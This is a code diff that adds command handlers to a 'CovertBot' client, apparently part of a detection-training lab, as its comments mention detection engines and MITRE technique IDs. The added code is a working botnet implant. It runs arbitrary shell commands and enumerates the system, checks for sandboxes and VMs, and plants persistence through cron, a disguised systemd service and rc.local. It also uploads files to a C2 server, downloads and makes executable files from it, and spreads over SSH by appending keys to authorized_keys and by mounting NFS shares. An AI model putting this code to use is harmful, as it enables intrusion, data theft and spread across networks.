@@ -801,6 +801,7 @@ class CovertBot:
         self._running      = True
         self._active       = {}     # cmd_type -> (thread, stop_event)
         self._active_lock  = threading.Lock()
+        self._last_shell_result = {}  # stores shell/recon output for /result
         self.poll_min = max(10, self.POLL_INTERVAL - self.POLL_JITTER)  # Gap 4+7
         self.poll_max = self.POLL_INTERVAL + self.POLL_JITTER            # Gap 4+7
         print(f"[COVERT] Bot ID: {self.bot_id}")
@@ -911,7 +912,255 @@ class CovertBot:
                       f"(new key: {derive_key(SHARED_SECRET).hex()[:8]}...)")
             else:
                 print(f"[COVERT] -> update_secret ignored: secret too short (<8 chars)")
-                
+          
+        elif cmd_type == "shell":
+            # ── Arbitrary shell command (mirrors C2_Server client.py) ──────
+            # Teaching point: Engine 12 (ProcWatch) detects the unexpected
+            # child process spawned here.
+            import subprocess as _sp
+            cmd_str = cmd.get("cmd", "id")
+            print(f"[COVERT] -> SHELL: {cmd_str}")
+            try:
+                r = _sp.run(cmd_str, shell=True, capture_output=True,
+                            text=True, timeout=30)
+                output = (r.stdout + r.stderr).strip()
+            except _sp.TimeoutExpired:
+                output = "ERROR: command timed out (30s)"
+            except Exception as exc:
+                output = f"ERROR: {exc}"
+            print(f"[COVERT] SHELL result: {output[:200]}")
+            self._last_shell_result = {"cmd": cmd_str, "output": output}
+        elif cmd_type == "system_profile":
+            # ── Full system enumeration (MITRE T1082 / T1016 / T1033) ──────
+            import subprocess as _sp, platform as _pl, socket as _sk
+            profile = {
+                "hostname": _sk.gethostname(),
+                "platform": _pl.platform(),
+                "python":   _pl.python_version(),
+                "uid":      os.getuid() if hasattr(os, "getuid") else "N/A",
+                "user":     os.environ.get("USER", os.environ.get("USERNAME", "?")),
+            }
+            for label, shell_cmd in [
+                ("ifconfig", "ip addr show 2>/dev/null || ifconfig 2>/dev/null"),
+                ("routes",   "ip route 2>/dev/null || route -n 2>/dev/null"),
+                ("users",    "cut -d: -f1 /etc/passwd 2>/dev/null | head -20"),
+                ("ps",       "ps aux --no-headers 2>/dev/null | head -30"),
+            ]:
+                try:
+                    r = _sp.run(shell_cmd, shell=True, capture_output=True,
+                                text=True, timeout=10)
+                    profile[label] = r.stdout.strip()[:500]
+                except Exception as exc:
+                    profile[label] = f"ERROR: {exc}"
+            print(f"[COVERT] SYSTEM_PROFILE collected ({len(str(profile))} bytes)")
+            self._last_shell_result = {"type": "system_profile", "profile": profile}
+        elif cmd_type == "sandbox_check":
+            # ── Sandbox / VM detection before payload delivery ──────────────
+            import subprocess as _sp
+            ind = {}
+            ind["cpu_count"] = os.cpu_count()
+            ind["low_cpu"]   = os.cpu_count() < 2
+            try:
+                uptime = float(open("/proc/uptime").read().split()[0])
+                ind["uptime_sec"]  = uptime
+                ind["low_uptime"]  = uptime < 600
+            except Exception:
+                ind["uptime_sec"] = -1; ind["low_uptime"] = False
+            try:
+                cpuinfo = open("/proc/cpuinfo").read().upper()
+                ind["vm_strings"] = [s for s in
+                    ["VBOX","VMWARE","KVM","QEMU","HYPERV","XEN"]
+                    if s in cpuinfo]
+            except Exception:
+                ind["vm_strings"] = []
+            try:
+                st = os.statvfs("/")
+                gb = st.f_blocks * st.f_frsize / 1e9
+                ind["disk_gb"]    = round(gb, 1)
+                ind["small_disk"] = gb < 20
+            except Exception:
+                ind["disk_gb"] = -1; ind["small_disk"] = False
+            ind["verdict"] = "SANDBOX/VM" if (
+                ind["low_cpu"] or ind["low_uptime"] or
+                ind["vm_strings"] or ind["small_disk"]
+            ) else "LIKELY_REAL"
+            print(f"[COVERT] SANDBOX_CHECK: {ind['verdict']}  {ind}")
+            self._last_shell_result = {"type": "sandbox_check", "result": ind}
+        elif cmd_type == "plant_persist":
+            # ── Install persistence (MITRE T1053 / T1543 / T1037) ──────────
+            import subprocess as _sp
+            method   = cmd.get("method", "cron")
+            bot_path = os.path.abspath(sys.argv[0])
+            success  = False; detail = ""
+            if method == "cron":
+                try:
+                    existing = _sp.run(["crontab", "-l"],
+                        capture_output=True, text=True).stdout
+                    if bot_path not in existing:
+                        cron_line = "@reboot python3 " + bot_path + " >> /tmp/.bot.log 2>&1\n"
+                        _sp.run(["crontab", "-"],
+                            input=existing + cron_line,
+                            capture_output=True, text=True)
+                    success = True; detail = f"cron @reboot entry added"
+                except Exception as exc:
+                    detail = f"cron failed: {exc}"
+            elif method == "systemd":
+                svc = (
+                    "[Unit]\nDescription=System Helper\n\n"
+                    "[Service]\nType=simple\nRestart=always\n"
+                    "ExecStart=/usr/bin/python3 " + bot_path + "\n\n"
+                    "[Install]\nWantedBy=multi-user.target\n"
+                )
+                try:
+                    open("/etc/systemd/system/sys-helper.service", "w").write(svc)
+                    _sp.run(["systemctl", "daemon-reload"], capture_output=True)
+                    _sp.run(["systemctl", "enable", "sys-helper"], capture_output=True)
+                    success = True; detail = "sys-helper.service enabled"
+                except Exception as exc:
+                    detail = f"systemd failed: {exc}"
+            elif method == "rc.local":
+                try:
+                    open("/etc/rc.local", "a").write("\npython3 " + bot_path + " &\n")
+                    success = True; detail = "rc.local entry appended"
+                except Exception as exc:
+                    detail = f"rc.local failed: {exc}"
+            print(f"[COVERT] PLANT_PERSIST method={method} ok={success} {detail}")
+            self._last_shell_result = {
+                "type": "plant_persist", "method": method,
+                "success": success, "detail": detail}
+        elif cmd_type == "remove_persist":
+            # ── Remove persistence ──────────────────────────────────────────
+            import subprocess as _sp
+            method   = cmd.get("method", "cron")
+            bot_path = os.path.abspath(sys.argv[0])
+            detail   = ""
+            if method == "cron":
+                try:
+                    existing = _sp.run(["crontab", "-l"],
+                        capture_output=True, text=True).stdout
+                    new = "\n".join(l for l in existing.splitlines()
+                                   if bot_path not in l) + "\n"
+                    _sp.run(["crontab", "-"], input=new, capture_output=True)
+                    detail = "cron entry removed"
+                except Exception as exc:
+                    detail = f"cron removal failed: {exc}"
+            elif method == "systemd":
+                try:
+                    _sp.run(["systemctl", "disable", "sys-helper"], capture_output=True)
+                    os.unlink("/etc/systemd/system/sys-helper.service")
+                    _sp.run(["systemctl", "daemon-reload"], capture_output=True)
+                    detail = "sys-helper.service removed"
+                except Exception as exc:
+                    detail = f"systemd removal failed: {exc}"
+            elif method == "rc.local":
+                try:
+                    lines = open("/etc/rc.local").readlines()
+                    open("/etc/rc.local", "w").writelines(
+                        l for l in lines if bot_path not in l)
+                    detail = "rc.local entry removed"
+                except Exception as exc:
+                    detail = f"rc.local removal failed: {exc}"
+            print(f"[COVERT] REMOVE_PERSIST method={method}: {detail}")
+            self._last_shell_result = {
+                "type": "remove_persist", "method": method, "detail": detail}
+        elif cmd_type == "upload_file":
+            # ── Exfiltrate file to C2 (MITRE T1041) ────────────────────────
+            import urllib.request as _ur
+            file_path = cmd.get("file_path", "")
+            c2_url    = f"http://{C2_HOST}:{C2_PORT}/upload"
+            if not file_path or not os.path.isfile(file_path):
+                self._last_shell_result = {
+                    "type": "upload_file", "success": False,
+                    "error": f"file not found: {file_path}"}
+            else:
+                try:
+                    data = open(file_path, "rb").read()
+                    req  = _ur.Request(c2_url, data=data,
+                        headers={"X-Auth-Token": AUTH_TOKEN,
+                                 "X-Filename": os.path.basename(file_path),
+                                 "Content-Type": "application/octet-stream"},
+                        method="POST")
+                    with _ur.urlopen(req, timeout=15) as resp:
+                        resp_body = resp.read().decode()
+                    print(f"[COVERT] UPLOAD_FILE: {file_path} ({len(data)}B) → C2")
+                    self._last_shell_result = {
+                        "type": "upload_file", "success": True,
+                        "file": file_path, "bytes": len(data),
+                        "c2_response": resp_body[:200]}
+                except Exception as exc:
+                    print(f"[COVERT] UPLOAD_FILE error: {exc}")
+                    self._last_shell_result = {
+                        "type": "upload_file", "success": False, "error": str(exc)}
+        elif cmd_type == "download_file":
+            # ── Pull file from C2 to bot (MITRE T1105) ─────────────────────
+            import urllib.request as _ur
+            file_path = cmd.get("file_path", "")
+            save_as   = os.path.join("/tmp", os.path.basename(file_path))
+            c2_url    = f"http://{C2_HOST}:{C2_PORT}/download/{os.path.basename(file_path)}"
+            try:
+                req = _ur.Request(c2_url, headers={"X-Auth-Token": AUTH_TOKEN})
+                with _ur.urlopen(req, timeout=15) as resp:
+                    data = resp.read()
+                open(save_as, "wb").write(data)
+                os.chmod(save_as, 0o755)
+                print(f"[COVERT] DOWNLOAD_FILE: {c2_url} → {save_as} ({len(data)}B)")
+                self._last_shell_result = {
+                    "type": "download_file", "success": True,
+                    "saved_as": save_as, "bytes": len(data)}
+            except Exception as exc:
+                print(f"[COVERT] DOWNLOAD_FILE error: {exc}")
+                self._last_shell_result = {
+                    "type": "download_file", "success": False, "error": str(exc)}
+        elif cmd_type == "lateral_ssh":
+            # ── SSH lateral movement (MITRE T1021.004) ─────────────────────
+            # Teaching point: Engine 20 (LateralMovementDetector) watches
+            # for new outbound SSH connections from the bot IP.
+            import subprocess as _sp
+            jump_target = cmd.get("jump_target", "192.168.100.30")
+            ssh_user    = cmd.get("ssh_user", "user")
+            ssh_opts    = "-o StrictHostKeyChecking=no -o ConnectTimeout=5 -o BatchMode=yes"
+            r = _sp.run(
+                f"ssh {ssh_opts} {ssh_user}@{jump_target} "
+                f"'echo LATERAL_OK && hostname && id'",
+                shell=True, capture_output=True, text=True, timeout=15)
+            ssh_out = r.stdout.strip() or r.stderr.strip()
+            key_dropped = False
+            pub = os.path.expanduser("~/.ssh/id_rsa.pub")
+            if os.path.isfile(pub):
+                pk = open(pub).read().strip()
+                r2 = _sp.run(
+                    f"ssh {ssh_opts} {ssh_user}@{jump_target} "
+                    f"'mkdir -p ~/.ssh && echo {pk!r} >> ~/.ssh/authorized_keys'",
+                    shell=True, capture_output=True, text=True, timeout=15)
+                key_dropped = (r2.returncode == 0)
+            print(f"[COVERT] LATERAL_SSH → {ssh_user}@{jump_target}: {ssh_out[:60]}")
+            self._last_shell_result = {
+                "type": "lateral_ssh", "target": jump_target,
+                "user": ssh_user, "ssh_output": ssh_out, "key_dropped": key_dropped}
+        elif cmd_type == "lateral_nfs":
+            # ── NFS lateral movement (MITRE T1570) ─────────────────────────
+            import subprocess as _sp, socket as _sk
+            nfs_share = cmd.get("nfs_share", "192.168.100.30:/export/share")
+            mount_pt  = "/tmp/.nfs_taint"
+            os.makedirs(mount_pt, exist_ok=True)
+            r = _sp.run(["mount", "-t", "nfs", nfs_share, mount_pt],
+                        capture_output=True, text=True, timeout=20)
+            if r.returncode == 0:
+                taint = os.path.join(mount_pt, ".bot_was_here")
+                import datetime as _dt
+                open(taint, "w").write(
+                    "taint from " + _sk.gethostname() +
+                    " at " + _dt.datetime.now().isoformat() + "\n")
+                _sp.run(["umount", mount_pt], capture_output=True)
+                print(f"[COVERT] LATERAL_NFS: taint written to {nfs_share}")
+                self._last_shell_result = {
+                    "type": "lateral_nfs", "share": nfs_share, "success": True}
+            else:
+                print(f"[COVERT] LATERAL_NFS: mount failed — {r.stderr.strip()[:80]}")
+                self._last_shell_result = {
+                    "type": "lateral_nfs", "share": nfs_share,
+                    "success": False, "error": r.stderr.strip()}
+                          
         elif cmd_type == "start_keylogger":
             import keylogger_sim
             result = keylogger_sim.handle_c2_task(cmd)
